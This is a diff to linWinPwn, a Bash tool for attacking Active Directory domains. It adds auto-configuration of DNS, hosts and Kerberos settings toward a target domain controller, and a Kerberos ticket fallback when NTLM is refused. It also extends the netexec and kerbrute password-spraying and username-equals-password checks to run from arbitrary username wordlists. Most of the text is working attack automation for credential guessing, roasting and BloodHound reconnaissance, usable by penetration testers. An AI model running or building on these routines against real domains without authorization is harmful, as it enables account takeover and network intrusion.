@@ -139,7 +139,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.0.23 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.0.24 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -286,6 +286,78 @@ run_command() {
     /usr/bin/script -qc "$@" /dev/null
 }
 
+ntp_update() {
+    echo -e ""
+    sudo timedatectl set-ntp 0
+    sudo ntpdate "${dc_ip}"
+    echo -e "${GREEN}[+] NTP sync complete${NC}"
+}
+
+etc_hosts_update() {
+    echo -e ""
+    if ! grep -q "${dc_ip}" "/etc/hosts" >/dev/null 2>&1; then
+        echo -e "# /etc/hosts entry added by linWinPwn" | sudo tee -a /etc/hosts
+        echo -e "${dc_ip}\t${dc_domain} ${dc_FQDN} ${dc_NETBIOS}" | sudo tee -a /etc/hosts
+        echo -e "${GREEN}[+] /etc/hosts update complete${NC}"
+    else
+        echo -e "${PURPLE}[-] Target IP already present in /etc/hosts... ${NC}"
+    fi
+}
+
+etc_resolv_update() {
+    echo -e ""
+    if ! grep -q "${dc_ip}" "/etc/resolv.conf" >/dev/null 2>&1; then
+        date "+%Y-%m-%d\ %H:%M:%S" | tee -a "${output_dir}/resolv.conf.backup"
+        echo -e "Content of /etc/resolv.conf before update:" | tee -a "${output_dir}/resolv.conf.backup"
+        echo -e "------------------------------------------" | tee -a "${output_dir}/resolv.conf.backup"
+        tee -a "${output_dir}/resolv.conf.backup" </etc/resolv.conf
+        echo -e "" | tee -a "${output_dir}/resolv.conf.backup"
+        echo -e "Content of /etc/resolv.conf after update:"
+        echo -e "-----------------------------------------"
+        sudo sed -i '/^#/! s/^/#/g' /etc/resolv.conf
+        echo -e "nameserver ${dc_ip}" | sudo tee -a /etc/resolv.conf
+        echo -e "${GREEN}[+] DNS update complete${NC}"
+    else
+        echo -e "${PURPLE}[-] Target IP already present in /etc/resolv.conf... ${NC}"
+    fi
+}
+
+etc_krb5conf_update() {
+    echo -e ""
+    date "+%Y-%m-%d\ %H:%M:%S" | tee -a "${output_dir}/krb5.conf.backup"
+    echo -e "Content of /etc/krb5.conf before update:" | tee -a "${output_dir}/krb5.conf.backup"
+    echo -e "----------------------------------------" | tee -a "${output_dir}/krb5.conf.backup"
+    tee -a "${output_dir}/krb5.conf.backup" </etc/krb5.conf
+    echo -e "" | tee -a "${output_dir}/krb5.conf.backup"
+    echo -e "Content of /etc/krb5.conf after update:"
+    echo -e "---------------------------------------"
+    echo -e "[libdefaults]" | sudo tee /etc/krb5.conf
+    echo -e "        default_realm = ${domain^^}" | sudo tee -a /etc/krb5.conf
+    echo -e "" | sudo tee -a /etc/krb5.conf
+    echo -e "# The following krb5.conf variables are only for MIT Kerberos." | sudo tee -a /etc/krb5.conf
+    echo -e "        kdc_timesync = 1" | sudo tee -a /etc/krb5.conf
+    echo -e "        ccache_type = 4" | sudo tee -a /etc/krb5.conf
+    echo -e "        forwardable = true" | sudo tee -a /etc/krb5.conf
+    echo -e "        proxiable = true" | sudo tee -a /etc/krb5.conf
+    echo -e "        rdns = false" | sudo tee -a /etc/krb5.conf
+    echo -e "" | sudo tee -a /etc/krb5.conf
+    echo -e "" | sudo tee -a /etc/krb5.conf
+    echo -e "        fcc-mit-ticketflags = true" | sudo tee -a /etc/krb5.conf
+    echo -e "        dns_canonicalize_hostname = false" | sudo tee -a /etc/krb5.conf
+    echo -e "        dns_lookup_realm = false" | sudo tee -a /etc/krb5.conf
+    echo -e "        dns_lookup_kdc = true" | sudo tee -a /etc/krb5.conf
+    echo -e "        k5login_authoritative = false" | sudo tee -a /etc/krb5.conf
+    echo -e "" | sudo tee -a /etc/krb5.conf
+    echo -e "[realms]" | sudo tee -a /etc/krb5.conf
+    echo -e "        ${domain^^} = {" | sudo tee -a /etc/krb5.conf
+    echo -e "                kdc = ${dc_FQDN}" | sudo tee -a /etc/krb5.conf
+    echo -e "        }" | sudo tee -a /etc/krb5.conf
+    echo -e "" | sudo tee -a /etc/krb5.conf
+    echo -e "[domain_realm]" | sudo tee -a /etc/krb5.conf
+    echo -e "        .${domain,,} = ${domain^^}" | sudo tee -a /etc/krb5.conf
+    echo -e "${GREEN}[+] KRB5 config update complete${NC}"
+}
+
 prepare() {
     if [ -z "$dc_ip" ]; then
         echo -e "${RED}[-] Missing target... ${NC}"
@@ -314,12 +386,16 @@ prepare() {
         echo -e "${RED}[-] Please ensure netexec is installed and try again... ${NC}"
         exit 1
     else
-        dc_info=$(${netexec} smb "${dc_ip}")
+        dc_info=$(${netexec} ldap "${dc_ip}" | grep -v "Connection refused")
     fi
 
     dc_NETBIOS=$(echo "$dc_info" | cut -d ":" -f 2 | sed "s/) (domain//g" | head -n 1)
     dc_domain=$(echo "$dc_info" | cut -d ":" -f 3 | sed "s/) (signing//g" | head -n 1)
-    dc_FQDN=${dc_NETBIOS}"."${dc_domain}
+    if [[ "${dc_NETBIOS}" == *"${dc_domain}"* ]]; then
+        dc_FQDN=${dc_NETBIOS}
+    else
+        dc_FQDN=${dc_NETBIOS}"."${dc_domain}
+    fi
 
     if [ -z "$dc_info" ]; then
         echo -e "${RED}[-] Error connecting to target! Please ensure the target is a Domain Controller and try again... ${NC}"
@@ -341,15 +417,11 @@ prepare() {
     if [[ $dc_open_ports == *"5985/tcp"* ]]; then dc_port_5985="${GREEN}open${NC}"; else dc_port_5985="${RED}filtered|closed${NC}"; fi
 
     if [ "${autoconfig_bool}" == true ]; then
-        echo -e "${BLUE}[*] NTP and /etc/hosts auto-config... ${NC}"
-        sudo timedatectl set-ntp 0
-        sudo ntpdate "${dc_ip}"
-        if ! grep -q "${dc_ip}" "/etc/hosts" >/dev/null 2>&1; then
-            echo -e "# /etc/hosts entry added by linWinPwn" | sudo tee -a /etc/hosts
-            echo -e "${dc_ip}\t${dc_domain} ${dc_FQDN} ${dc_NETBIOS}" | sudo tee -a /etc/hosts
-        else
-            echo -e "${PURPLE}[-] Target IP already present in /etc/hosts... ${NC}"
-        fi
+        echo -e "${BLUE}[*] Running auto-config... ${NC}"
+        ntp_update
+        etc_hosts_update
+        etc_resolv_update
+        etc_krb5conf_update
     fi
 
     if [ "${user}" == "" ]; then user_out="null"; else user_out=${user// /}; fi
@@ -665,6 +737,30 @@ authenticate() {
         auth_check=$(run_command "${netexec} smb ${target} ${argument_ne}" 2>&1 | grep "\[-\]\|Traceback" -A 10 2>&1)
         if [ -n "$auth_check" ]; then
             echo "$auth_check"
+            if [[ $auth_check == *"STATUS_NOT_SUPPORTED"* ]]; then
+                echo -e "${BLUE}[*] Domain does not support NTLM authentication. Attempting to generate TGT ticket to use Kerberos instead..${NC}"
+                if [ ! -f "${impacket_getTGT}" ]; then
+                    echo -e "${RED}[-] getTGT.py not found! Please verify the installation of impacket${NC}"
+                else
+                    if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
+                        current_dir=$(pwd)
+                        cd "${output_dir}/Credentials" || exit
+                        echo -e "${CYAN}[*] Requesting TGT for current user${NC}"
+                        run_command "${impacket_getTGT} ${argument_imp} -dc-ip ${dc_ip}" | grep -v "Impacket" | sed '/^$/d' | tee "${output_dir}/Credentials/getTGT_output_${dc_domain}"
+                        cd "${current_dir}" || exit
+                        if [ -f "${output_dir}/Credentials/${user}.ccache" ]; then
+                            krb_ticket="${output_dir}/Credentials/${user}.ccache"
+                            echo -e "${GREEN}[+] TGT generated successfully:${NC} $krb_ticket"
+                            echo -e "${GREEN}[+] Re-run linWinPwn to use ticket instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u ${user} -K ${krb_ticket}"
+                            exit 1
+                        else
+                            echo -e "${RED}[-] Failed to generate TGT${NC}"
+                        fi
+                    else
+                        echo -e "${RED}[-] Error! Requires password, NTLM hash or AES key...${NC}"
+                    fi
+                fi
+            fi
             if [[ $auth_check == *"STATUS_PASSWORD_MUST_CHANGE"* ]] || [[ $auth_check == *"STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT"* ]]; then
                 if [ ! -f "${impacket_changepasswd}" ]; then
                     echo -e "${RED}[-] changepasswd.py not found! Please verify the installation of impacket${NC}"
@@ -702,7 +798,6 @@ authenticate() {
                     fi
                     password="${pass_passchange}"
                     auth_check=""
-                    prepare
                     authenticate
                 fi
                 echo -e ""
@@ -845,9 +940,9 @@ bhd_enum() {
             else
                 current_dir=$(pwd)
                 cd "${output_dir}/DomainRecon/BloodHound" || exit
-                run_command "${bloodhound} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 5 --dns-tcp" | tee "${output_dir}/DomainRecon/BloodHound/bloodhound_output_${dc_domain}.txt"
+                run_command "${bloodhound} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 5 --dns-tcp -dc ${dc_FQDN}" | tee "${output_dir}/DomainRecon/BloodHound/bloodhound_output_${dc_domain}.txt"
                 cd "${current_dir}" || exit
-                #${netexec} ${ne_verbose} ldap ${ne_kerb} ${target} "${argument_ne}" --bloodhound -ns ${dc_ip} -c All --log ${output_dir}/DomainRecon/BloodHound/ne_bloodhound_output_${dc_domain}.txt" 2>&1
+                #run_command "${netexec} ${ne_verbose} ldap ${ne_kerb} ${target} ${argument_ne} --bloodhound --dns-server ${dc_ip} -c All --log ${output_dir}/DomainRecon/BloodHound/ne_bloodhound_output_${dc_domain}.txt" 2>&1
                 /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${output_dir}"/DomainRecon/BloodHound/*_users.json 2>/dev/null >"${output_dir}/DomainRecon/Users/users_list_bhd_${dc_domain}.txt"
                 /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${output_dir}"/DomainRecon/BloodHound/*_computers.json 2>/dev/null >"${output_dir}/DomainRecon/Servers/servers_list_bhd_${dc_domain}.txt"
                 /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${output_dir}"/DomainRecon/BloodHound/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u >"${output_dir}/DomainRecon/Servers/sql_list_bhd_${dc_domain}.txt"
@@ -873,9 +968,9 @@ bhd_enum_dconly() {
             else
                 current_dir=$(pwd)
                 cd "${output_dir}/DomainRecon/BloodHound" || exit
-                run_command "${bloodhound} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 5 --dns-tcp" | tee "${output_dir}/DomainRecon/BloodHound/bloodhound_output_dconly_${dc_domain}.txt"
+                run_command "${bloodhound} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 5 --dns-tcp -dc ${dc_FQDN}" | tee "${output_dir}/DomainRecon/BloodHound/bloodhound_output_dconly_${dc_domain}.txt"
                 cd "${current_dir}" || exit
-                #${netexec} ${ne_verbose} ldap ${target} "${argument_ne}" --bloodhound -ns ${dc_ip} -c DCOnly --log tee "${output_dir}/DomainRecon/BloodHound/ne_bloodhound_output_${dc_domain}.txt" 2>&1
+                #run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} --bloodhound --dns-server ${dc_ip} -c DCOnly --log tee ${output_dir}/DomainRecon/BloodHound/ne_bloodhound_output_${dc_domain}.txt" 2>&1
                 /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${output_dir}"/DomainRecon/BloodHound/*_users.json 2>/dev/null >"${output_dir}/DomainRecon/Users/users_list_bhd_${dc_domain}.txt"
                 /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${output_dir}"/DomainRecon/BloodHound/*_computers.json 2>/dev/null >"${output_dir}/DomainRecon/Servers/servers_list_bhd_${dc_domain}.txt"
                 parse_users
@@ -900,7 +995,7 @@ bhdce_enum() {
             else
                 current_dir=$(pwd)
                 cd "${output_dir}/DomainRecon/BloodhoundCE" || exit
-                run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 5 --dns-tcp" | tee "${output_dir}/DomainRecon/BloodhoundCE/bloodhound_output_${dc_domain}.txt"
+                run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 5 --dns-tcp -dc ${dc_FQDN}" | tee "${output_dir}/DomainRecon/BloodhoundCE/bloodhound_output_${dc_domain}.txt"
                 cd "${current_dir}" || exit
                 /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${output_dir}"/DomainRecon/BloodhoundCE/*_users.json 2>/dev/null >"${output_dir}/DomainRecon/Users/users_list_bhdce_${dc_domain}.txt"
                 /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${output_dir}"/DomainRecon/BloodhoundCE/*_computers.json 2>/dev/null >"${output_dir}/DomainRecon/Servers/servers_list_bhdce_${dc_domain}.txt"
@@ -927,7 +1022,7 @@ bhdce_enum_dconly() {
             else
                 current_dir=$(pwd)
                 cd "${output_dir}/DomainRecon/BloodHoundCE" || exit
-                run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 5 --dns-tcp" | tee "${output_dir}/DomainRecon/BloodHoundCE/bloodhound_output_dconly_${dc_domain}.txt"
+                run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 5 --dns-tcp -dc ${dc_FQDN}" | tee "${output_dir}/DomainRecon/BloodHoundCE/bloodhound_output_dconly_${dc_domain}.txt"
                 cd "${current_dir}" || exit
                 /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${output_dir}"/DomainRecon/BloodHoundCE/*_users.json 2>/dev/null >"${output_dir}/DomainRecon/Users/users_list_bhdce_${dc_domain}.txt"
                 /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${output_dir}"/DomainRecon/BloodHoundCE/*_computers.json 2>/dev/null >"${output_dir}/DomainRecon/Servers/servers_list_bhdce_${dc_domain}.txt"
@@ -1192,11 +1287,11 @@ ldeep_enum() {
     else
         mkdir -p "${output_dir}/DomainRecon/ldeepDump"
         echo -e "${BLUE}[*] ldeep Enumeration${NC}"
-        if [ -n "$(find "${output_dir}/DomainRecon/ldeepDump/" -maxdepth 1 -type f ! -name 'ldeep_output' -print -quit)" ]; then
+        if [ -n "$(find "${output_dir}/DomainRecon/ldeepDump/" -type f -name '*.json' -print -quit)" ]; then
             echo -e "${YELLOW}[i] ldeep results found, skipping... ${NC}"
         else
-            if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
-                echo -e "${PURPLE}[-] ldeep does not support Kerberos authentication${NC}"
+            if [ "${aeskey_bool}" == true ]; then
+                echo -e "${PURPLE}[-] ldeep does not support Kerberos authentication using AES Key${NC}"
             else
                 if [ "${ldaps_bool}" == true ] || [ "${cert_bool}" == true ]; then ldaps_param="-s ldaps://"; else ldaps_param="-s ldap://"; fi
                 run_command "${ldeep} ldap ${argument_ldeep} ${ldaps_param}${target} all ${output_dir}/DomainRecon/ldeepDump/${dc_domain}" 2>&1 | tee "${output_dir}/DomainRecon/ldeepDump/ldeep_output_${dc_domain}.txt"
@@ -1305,11 +1400,11 @@ ldapper_enum() {
     if [ ! -f "${ldapper}" ]; then
         echo -e "${RED}[-] Please verify the installation of ldapper${NC}"
     else
+        echo -e "${BLUE}[*] Enumeration of LDAP using ldapper${NC}"
         if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
             echo -e "${PURPLE}[-] ldapper requires credentials and does not support Kerberos authentication${NC}"
         else
             mkdir -p "${output_dir}/DomainRecon/LDAPPER"
-            echo -e "${BLUE}[*] Enumeration of LDAP using ldapper${NC}"
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-n 1"; else ldaps_param="-n 2"; fi
             echo -e "${CYAN}[*] Get all users${NC}"
             run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '1' -f json" >"${output_dir}/DomainRecon/LDAPPER/users_output_${dc_domain}.json"
@@ -1898,19 +1993,24 @@ kerbrute_enum() {
 
 userpass_ne_check() {
     parse_users
+    target_userslist="${users_list}"
     if [ ! -s "${users_list}" ]; then
-        echo -e "${PURPLE}[-] No users found! Please re-run users enumeration and try again..${NC}"
-    else
-        echo -e "${BLUE}[*] netexec User=Pass Check (Noisy!)${NC}"
-        echo -e "${YELLOW}[i] Finding users with Password = username using netexec. This may take a while...${NC}"
-        run_command "${netexec} ${ne_verbose} smb ${target} -u ${users_list} -p ${users_list} --no-bruteforce --continue-on-success" >"${output_dir}/BruteForce/ne_userpass_output_${dc_domain}.txt"
-        grep "\[+\]" "${output_dir}/BruteForce/ne_userpass_output_${dc_domain}.txt" | cut -d "\\" -f 2 | cut -d " " -f 1 >"${output_dir}/BruteForce/user_eq_pass_valid_ne_${dc_domain}.txt"
-        if [ -s "${output_dir}/BruteForce/user_eq_pass_valid_ne_${dc_domain}.txt" ]; then
-            echo -e "${GREEN}[+] Printing accounts with username=password...${NC}"
-            /bin/cat "${output_dir}/BruteForce/user_eq_pass_valid_ne_${dc_domain}.txt" 2>/dev/null
-        else
-            echo -e "${PURPLE}[-] No accounts with username=password found${NC}"
+        userslist_ans="N"
+        echo -e "${PURPLE}[!] No known users found. Would you like to use custom wordlist instead (y/N)?${NC}"
+        read -rp ">> " userslist_ans </dev/tty
+        if [[ "${userslist_ans}" == "y" ]] || [[ "${userslist_ans}" == "Y" ]]; then
+            target_userslist="${user_wordlist}"
         fi
+    fi
+    echo -e "${BLUE}[*] netexec User=Pass Check (Noisy!)${NC}"
+    echo -e "${YELLOW}[i] Finding users with Password = username using netexec. This may take a while...${NC}"
+    run_command "${netexec} ${ne_verbose} smb ${target} -u ${target_userslist} -p ${target_userslist} --no-bruteforce --continue-on-success" | tee "${output_dir}/BruteForce/ne_userpass_output_${dc_domain}.txt"
+    grep "\[+\]" "${output_dir}/BruteForce/ne_userpass_output_${dc_domain}.txt" | cut -d "\\" -f 2 | cut -d " " -f 1 >"${output_dir}/BruteForce/user_eq_pass_valid_ne_${dc_domain}.txt"
+    if [ -s "${output_dir}/BruteForce/user_eq_pass_valid_ne_${dc_domain}.txt" ]; then
+        echo -e "${GREEN}[+] Printing accounts with username=password...${NC}"
+        /bin/cat "${output_dir}/BruteForce/user_eq_pass_valid_ne_${dc_domain}.txt" 2>/dev/null
+    else
+        echo -e "${PURPLE}[-] No accounts with username=password found${NC}"
     fi
     echo -e ""
 }
@@ -1920,26 +2020,30 @@ userpass_kerbrute_check() {
         echo -e "${RED}[-] Please verify the location of kerbrute${NC}"
     else
         parse_users
+        target_userslist="${users_list}"
         user_pass_wordlist="${output_dir}/BruteForce/kerbrute_userpass_wordlist_${dc_domain}.txt"
-
         echo -e "${BLUE}[*] kerbrute User=Pass Check (Noisy!)${NC}"
-        if [ -s "${users_list}" ]; then
-            echo -e "${YELLOW}[i] Finding users with Password = username using kerbrute. This may take a while...${NC}"
-            /bin/rm "${user_pass_wordlist}" 2>/dev/null
-            while IFS= read -r i; do
-                echo -e "${i}:${i}" >>"${user_pass_wordlist}"
-            done <"${users_list}"
-            sort -uf "${user_pass_wordlist}" -o "${user_pass_wordlist}"
-            run_command "${kerbrute} bruteforce ${user_pass_wordlist} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}" >"${output_dir}/BruteForce/kerbrute_pass_output_${dc_domain}.txt"
-            grep "VALID" "${output_dir}/BruteForce/kerbrute_pass_output_${dc_domain}.txt" | cut -d " " -f 8 | cut -d "@" -f 1 >"${output_dir}/BruteForce/user_eq_pass_valid_kerb_${dc_domain}.txt"
-            if [ -s "${output_dir}/BruteForce/user_eq_pass_valid_kerb_${dc_domain}.txt" ]; then
-                echo -e "${GREEN}[+] Printing accounts with username=password...${NC}"
-                /bin/cat "${output_dir}/BruteForce/user_eq_pass_valid_kerb_${dc_domain}.txt" 2>/dev/null
-            else
-                echo -e "${PURPLE}[-] No accounts with username=password found${NC}"
+        if [ ! -s "${users_list}" ]; then
+            userslist_ans="N"
+            echo -e "${PURPLE}[!] No known users found. Would you like to use custom wordlist instead (y/N)?${NC}"
+            read -rp ">> " userslist_ans </dev/tty
+            if [[ "${userslist_ans}" == "y" ]] || [[ "${userslist_ans}" == "Y" ]]; then
+                target_userslist="${user_wordlist}"
             fi
+        fi
+        echo -e "${YELLOW}[i] Finding users with Password = username using kerbrute. This may take a while...${NC}"
+        /bin/rm "${user_pass_wordlist}" 2>/dev/null
+        while IFS= read -r i; do
+            echo -e "${i}:${i}" >>"${user_pass_wordlist}"
+        done <"${target_userslist}"
+        sort -uf "${user_pass_wordlist}" -o "${user_pass_wordlist}"
+        run_command "${kerbrute} bruteforce ${user_pass_wordlist} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}" | tee "${output_dir}/BruteForce/kerbrute_pass_output_${dc_domain}.txt"
+        grep "VALID" "${output_dir}/BruteForce/kerbrute_pass_output_${dc_domain}.txt" | cut -d " " -f 8 | cut -d "@" -f 1 >"${output_dir}/BruteForce/user_eq_pass_valid_kerb_${dc_domain}.txt"
+        if [ -s "${output_dir}/BruteForce/user_eq_pass_valid_kerb_${dc_domain}.txt" ]; then
+            echo -e "${GREEN}[+] Printing accounts with username=password...${NC}"
+            /bin/cat "${output_dir}/BruteForce/user_eq_pass_valid_kerb_${dc_domain}.txt" 2>/dev/null
         else
-            echo -e "${PURPLE}[-] No known users found. Run user enumeraton and try again.${NC}"
+            echo -e "${PURPLE}[-] No accounts with username=password found${NC}"
         fi
     fi
     echo -e ""
@@ -1947,25 +2051,30 @@ userpass_kerbrute_check() {
 
 ne_passpray() {
     parse_users
+    target_userslist="${users_list}"
     if [ ! -s "${users_list}" ]; then
-        echo -e "${PURPLE}[-] No users found! Please re-run users enumeration and try again..${NC}"
-    else
-        echo -e "${BLUE}[*] Password spray using netexec (Noisy!)${NC}"
-        echo -e "${BLUE}[*] Please specify password for password spray:${NC}"
-        read -rp ">> " passpray_password </dev/tty
-        while [ "${passpray_password}" == "" ]; do
-            echo -e "${RED}Invalid password.${NC} Please specify password:"
-            read -rp ">> " passpray_password </dev/tty
-        done
-        echo -e "${YELLOW}[i] Password spraying with password ${passpray_password}. This may take a while...${NC}"
-        run_command "${netexec} ${ne_verbose} ldap ${target_dc} -u ${users_list} -p ${passpray_password} --no-bruteforce --continue-on-success --log ${output_dir}/BruteForce/ne_passpray_output_${dc_domain}.txt" 2>&1
-        grep "\[+\]" "${output_dir}/BruteForce/ne_passpray_output_${dc_domain}.txt" | cut -d "\\" -f 2 | cut -d " " -f 1 >"${output_dir}/BruteForce/passpray_valid_ne_${dc_domain}.txt"
-        if [ -s "${output_dir}/BruteForce/passpray_valid_ne_${dc_domain}.txt" ]; then
-            echo -e "${GREEN}[+] Printing accounts with password ${passpray_password}...${NC}"
-            /bin/cat "${output_dir}/BruteForce/passpray_valid_ne_${dc_domain}.txt" 2>/dev/null
-        else
-            echo -e "${PURPLE}[-] No accounts with password ${passpray_password} found${NC}"
+        userslist_ans="N"
+        echo -e "${PURPLE}[!] No known users found. Would you like to use custom wordlist instead (y/N)?${NC}"
+        read -rp ">> " userslist_ans </dev/tty
+        if [[ "${userslist_ans}" == "y" ]] || [[ "${userslist_ans}" == "Y" ]]; then
+            target_userslist="${user_wordlist}"
         fi
+    fi
+    echo -e "${BLUE}[*] Password spray using netexec (Noisy!)${NC}"
+    echo -e "${BLUE}[*] Please specify password for password spray:${NC}"
+    read -rp ">> " passpray_password </dev/tty
+    while [ "${passpray_password}" == "" ]; do
+        echo -e "${RED}Invalid password.${NC} Please specify password:"
+        read -rp ">> " passpray_password </dev/tty
+    done
+    echo -e "${YELLOW}[i] Password spraying with password ${passpray_password}. This may take a while...${NC}"
+    run_command "${netexec} ${ne_verbose} ldap ${target_dc} -u ${target_userslist} -p ${passpray_password} --no-bruteforce --continue-on-success --log ${output_dir}/BruteForce/ne_passpray_output_${dc_domain}.txt" 2>&1
+    grep "\[+\]" "${output_dir}/BruteForce/ne_passpray_output_${dc_domain}.txt" | cut -d "\\" -f 2 | cut -d " " -f 1 >"${output_dir}/BruteForce/passpray_valid_ne_${dc_domain}.txt"
+    if [ -s "${output_dir}/BruteForce/passpray_valid_ne_${dc_domain}.txt" ]; then
+        echo -e "${GREEN}[+] Printing accounts with password ${passpray_password}...${NC}"
+        /bin/cat "${output_dir}/BruteForce/passpray_valid_ne_${dc_domain}.txt" 2>/dev/null
+    else
+        echo -e "${PURPLE}[-] No accounts with password ${passpray_password} found${NC}"
     fi
     echo -e ""
 }
@@ -1975,25 +2084,30 @@ kerbrute_passpray() {
         echo -e "${RED}[-] Please verify the location of kerbrute${NC}"
     else
         parse_users
-        if [ -s "${users_list}" ]; then
-            echo -e "${BLUE}[*] Password spray using kerbrute (Noisy!)${NC}"
-            echo -e "${BLUE}[*] Please specify password for password spray:${NC}"
-            read -rp ">> " passpray_password </dev/tty
-            while [ "${passpray_password}" == "" ]; do
-                echo -e "${RED}Invalid password.${NC} Please specify password:"
-                read -rp ">> " passpray_password </dev/tty
-            done
-            echo -e "${YELLOW}[i] Password spraying with password ${passpray_password}. This may take a while...${NC}"
-            run_command "${kerbrute} passwordspray ${users_list} ${passpray_password} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}" >"${output_dir}/BruteForce/kerbrute_passpray_output_${dc_domain}.txt"
-            grep "VALID" "${output_dir}/BruteForce/kerbrute_passpray_output_${dc_domain}.txt" | cut -d " " -f 8 | cut -d "@" -f 1 >"${output_dir}/BruteForce/passpray_valid_kerb_${dc_domain}.txt"
-            if [ -s "${output_dir}/BruteForce/passpray_valid_kerb_${dc_domain}.txt" ]; then
-                echo -e "${GREEN}[+] Printing accounts with password ${passpray_password}...${NC}"
-                /bin/cat "${output_dir}/BruteForce/passpray_valid_kerb_${dc_domain}.txt" 2>/dev/null
-            else
-                echo -e "${PURPLE}[-] No accounts with password ${passpray_password} found${NC}"
+        target_userslist="${users_list}"
+        if [ ! -s "${users_list}" ]; then
+            userslist_ans="N"
+            echo -e "${PURPLE}[!] No known users found. Would you like to use custom wordlist instead (y/N)?${NC}"
+            read -rp ">> " userslist_ans </dev/tty
+            if [[ "${userslist_ans}" == "y" ]] || [[ "${userslist_ans}" == "Y" ]]; then
+                target_userslist="${user_wordlist}"
             fi
+        fi
+        echo -e "${BLUE}[*] Password spray using kerbrute (Noisy!)${NC}"
+        echo -e "${BLUE}[*] Please specify password for password spray:${NC}"
+        read -rp ">> " passpray_password </dev/tty
+        while [ "${passpray_password}" == "" ]; do
+            echo -e "${RED}Invalid password.${NC} Please specify password:"
+            read -rp ">> " passpray_password </dev/tty
+        done
+        echo -e "${YELLOW}[i] Password spraying with password ${passpray_password}. This may take a while...${NC}"
+        run_command "${kerbrute} passwordspray ${target_userslist} ${passpray_password} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}" | tee "${output_dir}/BruteForce/kerbrute_passpray_output_${dc_domain}.txt"
+        grep "VALID" "${output_dir}/BruteForce/kerbrute_passpray_output_${dc_domain}.txt" | cut -d " " -f 8 | cut -d "@" -f 1 >"${output_dir}/BruteForce/passpray_valid_kerb_${dc_domain}.txt"
+        if [ -s "${output_dir}/BruteForce/passpray_valid_kerb_${dc_domain}.txt" ]; then
+            echo -e "${GREEN}[+] Printing accounts with password ${passpray_password}...${NC}"
+            /bin/cat "${output_dir}/BruteForce/passpray_valid_kerb_${dc_domain}.txt" 2>/dev/null
         else
-            echo -e "${PURPLE}[-] No known users found. Run user enumeraton and try again.${NC}"
+            echo -e "${PURPLE}[-] No accounts with password ${passpray_password} found${NC}"
         fi
     fi
     echo -e ""
@@ -2054,7 +2168,7 @@ asrep_attack() {
     else
         parse_users
         echo -e "${BLUE}[*] AS REP Roasting Attack${NC}"
-        if [[ "${dc_domain}" != "${domain}" ]] || [ "${nullsess_bool}" == true ]; then
+        if [[ "${dc_domain,,}" != "${domain,,}" ]] || [ "${nullsess_bool}" == true ]; then
             if [ -s "${users_list}" ]; then
                 users_scan_list=${users_list}
             else
@@ -2111,7 +2225,7 @@ kerberoast_attack() {
     if [ ! -f "${impacket_GetUserSPNs}" ]; then
         echo -e "${RED}[-] GetUserSPNs.py not found! Please verify the installation of impacket${NC}"
     else
-        if [[ "${dc_domain}" != "${domain}" ]] || [ "${nullsess_bool}" == true ]; then
+        if [[ "${dc_domain,,}" != "${domain,,}" ]] || [ "${nullsess_bool}" == true ]; then
             parse_users
             echo -e "${BLUE}[*] Blind Kerberoasting Attack${NC}"
             asrep_user=$(cut -d "@" -f 1 "${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt" | head -n 1)
@@ -2495,8 +2609,6 @@ webdav_check() {
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M webdav --log ${output_dir}/Vulnerabilities/ne_webdav_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
-
-
 
 smbsigning_check() {
     echo -e "${BLUE}[*] Listing servers with SMB signing disabled or not required ${NC}"
@@ -3757,10 +3869,10 @@ pkinit_auth() {
 }
 
 get_domain_sid() {
